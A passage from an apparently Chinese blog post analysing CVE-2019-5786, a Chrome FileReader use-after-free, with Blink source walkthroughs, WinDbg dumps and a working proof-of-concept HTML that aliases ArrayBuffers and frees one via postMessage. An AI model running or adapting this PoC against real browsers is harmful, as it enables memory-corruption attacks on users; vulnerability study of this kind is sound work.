class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::<span class="built_in">Create</span>(</span><br><span class="line">        ArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">Data</span>(), raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="built_in">AdjustReportedMemoryUsageToV8</span>(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复后的逻辑仅仅在数据正在被加载时的处理不同，它使用了DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()))的返回值。</p><p>所以首先查看ToArrayBuffer()函数，首先判断已加载的部分是否等于buffer的长度，如果不满足条件，则调用Slice函数对buffer_进行切割。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc</span></span><br><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBufferBuilder::ToArrayBuffer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;<span class="built_in">ByteLength</span>() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;<span class="built_in">Slice</span>(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看Slice函数，简单的调用了SliceImpl函数对buffer_进行处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Slice</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">SliceImpl</span>(<span class="built_in">ClampIndex</span>(begin), <span class="built_in">ClampIndex</span>(end));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的ClampIndex函数作用为对参数值进行处理，首先将小于0的参数转换成从后面计算的偏移，之后再将参数限定在0和ByteLength()之间。其目的就是对参数进行处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampIndex</span><span class="params">(<span class="keyword">int</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> current_length = <span class="built_in">ByteLength</span>();</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">    index = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(current_length + index);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ClampValue</span>(index, <span class="number">0</span>, current_length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampValue</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">unsigned</span> left, <span class="keyword">unsigned</span> right)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_LE</span>(left, right);</span><br><span class="line">  <span class="keyword">unsigned</span> result;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span>&gt;(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result &lt; left)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">if</span> (right &lt; result)</span><br><span class="line">    result = right;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进SliceImpl函数，该函数调用了ArrayBuffer::Create函数，以static_cast&lt;const char*&gt;(Data()) + begin与长度作为参数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::SliceImpl</span><span class="params">(<span class="keyword">unsigned</span> begin, <span class="keyword">unsigned</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::<span class="built_in">Create</span>(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="built_in">Data</span>()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看下Data()的定义，发现是将buffer的数据返回，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ArrayBuffer::Data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> contents_.<span class="built_in">Data</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看下ArrayBuffer::Create函数，该函数的作用就是创建一个buffer，并将之前的数据拷贝进去。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* source, <span class="keyword">size_t</span> byte_length)</span> </span>&#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared, ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">UNLIKELY</span>(!contents.<span class="built_in">Data</span>()))</span><br><span class="line">    <span class="built_in">OOM_CRASH</span>();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::<span class="built_in">AdoptRef</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;<span class="built_in">Data</span>(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;<span class="comment">//调试时发现，在32位程序中，buffer-&gt;Data()的地址每回都在变化，有时候可能会重用，而source的地址是固定的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时我们从该函数抽出，返回到最开始代码位置，查看DOMArrayBuffer* Create函数逻辑</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#third_party/blink/renderer/core/fileapi/file_reader_loader.cc</span><br><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line"></span><br><span class="line">#third_party/blink/renderer/core/typed_arrays/dom_array_buffer.<span class="function">h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(std::<span class="built_in">move</span>(buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出通过std::move操作了buffer缓冲区，关于std::move在背景知识的第5部分已经进行了描述，这里的作用是将该缓冲区的所有权从主线程转移到了worker线程。</p><h4 id="（2）动态调试"><a href="#（2）动态调试" class="headerlink" title="（2）动态调试"></a>（2）动态调试</h4><h5 id="（1）触发相关函数"><a href="#（1）触发相关函数" class="headerlink" title="（1）触发相关函数"></a>（1）触发相关函数</h5><p>首先编写代码触发函数调用，通过动态调试查看我们关心的数据结构并理清程序的执行流</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> blob = <span class="keyword">new</span> Blob([contents]);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">`[onprogress] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">`[onloadend] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure><p>执行结果如下，可以看出onprogress和onloadend都会处理长度为0x8000000的情况</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526175135865.png" alt="image-20210526175135865"></p><p>动态调试分析下源代码中下面的这段逻辑代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br></pre></td></tr></table></figure><p>查看ArrayBuffer::Create()函数的返回值。返回的是一个buffer结构体简介指针，可以通过这个指针获取到ByteLength()和Data()。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526152211843.png" alt="image-20210526152211843"></p><p>而这个返回值我们关心的内存地址可以通过下面的表达式获取，其中偏移0x4的位置为data数据存放位置，偏移0x8的位置为返回的buffer的大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">009cedb8  49c04f20 009cedbc d1bd2bff 3b0937a0</span><br><span class="line">0:000&gt; dd poi(poi(eax)+4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure><p>再经由上层的DOMArrayBuffer::Create()函数处理之后，返回值为0x58954e00。同样可以通过这个指针获取到ByteLength()和Data()。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526155314949.png" alt="image-20210526155314949"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">58954e00  1331e300 00000000 49c04f20 00000000</span><br><span class="line">0:000&gt; dd poi(poi(eax+0x8)+0x4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure><p>ToArrayBuffer()函数调用了ArrayBuffer::Create()函数来分配buffer，而ArrayBuffer::Create()的返回值实际上也正是ToArrayBuffer()的返回值。是上面的0x009cedb8，将该返回值作为DOMArrayBuffer::Create()函数的参数，该函数同样得到了一个返回值0x58954e00。</p><h5 id="（2）简单梳理"><a href="#（2）简单梳理" class="headerlink" title="（2）简单梳理"></a>（2）简单梳理</h5><p>简单梳理下代码静态分析以及刚刚动态调试得到的结果。还是拿之前的FileReaderLoader::ArrayBufferResult()代码进行描述：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::<span class="function"><span class="title">ArrayBufferResult</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> nullptr;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        -<span class="number">1</span> * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于先执行了DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());再对 finished_loading_进行判断以对array_buffer_result_进行赋值，之后在代码的最上面对 array_buffer_result_ 进行判断，所以就存在这样一个问题：文件加载完成后，ToArrayBuffer逻辑中对buffer_-&gt;ByteLength与bytes_used_是否相等的判断才会成功，从而从而直接返回缓冲区的指针，否则返回指向该缓冲区副本的指针。我们聚焦下直接返回缓冲区的指针的情况，此时返回的指针result可以间接指向buffer的缓冲区，之后finished_loading_加载完成，执行了语句 <strong>array_buffer_result_ = result;</strong> 这样我们下次进入该函数时，通过了第三行代码的判断，直接放回间接指向buffer缓冲区的指针，此时原来的result指针也可以操作buffer缓冲区，由于两个指针可以同时操作一块地址空间，这就造成了UAF。</p><p>下面是调试记录</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526190651045.png" alt="image-20210526190651045"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#下面的四个内存分布对应了上面的四次事件触发</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957318  1331e300 00000000 49c04680 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957328  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957338  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd esi</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c04680</span><br><span class="line">49c04680  00000001 49c6a560 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000003 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c6a560</span><br><span class="line">49c6a560  00000001 a0204000 07ff0000 10e9de4c#第一次为bytes_used_还小于buffer_-&gt;ByteLength时，此时偏移0x8位置为临时buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c#后面三次为bytes_used_等于buffer_-&gt;ByteLength时，此时偏移0x8位置为真实要操作的buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line"></span><br><span class="line">#此时可见58957328与58957338两个指针都可以操作49c04820这块空间，进而控制buffer，如果释放掉其中一个而使用另外一个，则会造成UAF。</span><br><span class="line">0:000&gt; dd 58957328</span><br><span class="line">58957328  1331e300 095520d8 49c04820 00a80010</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br></pre></td></tr></table></figure><p>对上面的内存现场进行分析</p><blockquote><p>1、第一次尚未读取完成，返回的指针指向临时buffer中。大小0x07ff0000。</p><p>2、第二次读取完成，但是此时finished_loading_还未置为1，返回真实buffer。大小0x08000000。</p><p>3、第三次读取完成，此时finished_loading_已经置为1，并对array_buffer_result_进行了赋值。返回真实buffer。大小0x08000000。与2的指针值不相同。</p><p>2、第四次读取完成，触发onloadend，返回真实buffer。大小0x08000000，与3的指针值相同。</p></blockquote><p>简单来说就是由于逻辑错误使两个指针可以操作同一块内存，而且可以发现最后两个onprogress指针地址就是不相同的，而onloadend与最后一个onprogress的指针是相同的。所以poc或者exp的构造方式就有两种情况：</p><blockquote><p>1、找到最后两个相同大小的onprogress指针进行操作。（下面exp的方式）</p><p>2、找到倒数第二个onprogress指针与onloadend指针进行操作，当然也需要这两个指针指向的长度相同。（下面poc的方式）</p></blockquote><h4 id="（3）POC分析"><a href="#（3）POC分析" class="headerlink" title="（3）POC分析"></a>（3）POC分析</h4><p>代码如下，这里的代码参考[14]</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        ab1 = event.target.result;<span class="comment">//event.target.result：事件的元素</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;<span class="comment">//这里判断下ab1和ab2的指针是否相同，但是我在调试中发现event.target.result返回的是type，不是很能理解</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);<span class="comment">//这里将前四个字节改成0x61616161</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;<span class="comment">//这里验证下ab1和ab2是否可以操作同一块空间</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;verify succeed! try crash self...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            crash();<span class="comment">//尝试触发崩溃。</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;verify failed, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;failed this time, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);<span class="comment">//如果验证失败则会重新进行尝试</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">&#x27;A&#x27;</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);<span class="comment">//这里的Blob为Binary Large Object的缩写，File继承自Blob</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="javascript">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="javascript">    reader.readAsArrayBuffer(blob);<span class="comment">//FileReader.readAsText()可以轻易地处理一个300k的日志文件，但当日志文件有1G到2G那么大，浏览器就会崩溃。这是因为readAsText()会一下子把目标文件加载至内存，导致内存超出上限。所以如果Web应用常常需要处理大文件时，我们应该使用FileReader.readAsArrayBuffer()来一块一块读取文件。而onProgress每当读取blob时就会触发，而onloadend为当文件加载或读取完成后触发。</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        worker.postMessage(ab1, [ab1, ab2]);<span class="comment">//核心是通过postmessage进行触发crash，postmessage定义参考[15]，其中第一个参数为aMessage，表示要发送的消息（可能是变量值也可能是结构体），第二个参数为transferList，这个参数可选，用于传递所有权。如果一个对象的所有权被转移，在发送它的上下文中将变为不可用（中止），并且只有在它被发送到的worker中可用。转移所有权这个过程中所以我们在转移ab1的所有权后再转移ab2时会抛出异常。调试时发现postMessage调用了chrome_child!WTF::ArrayBufferContents::FreeMemory函数释放掉了内存</span></span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);<span class="comment">//此时再对该空间进行写操作即可触发UAF</span></span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">init();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span 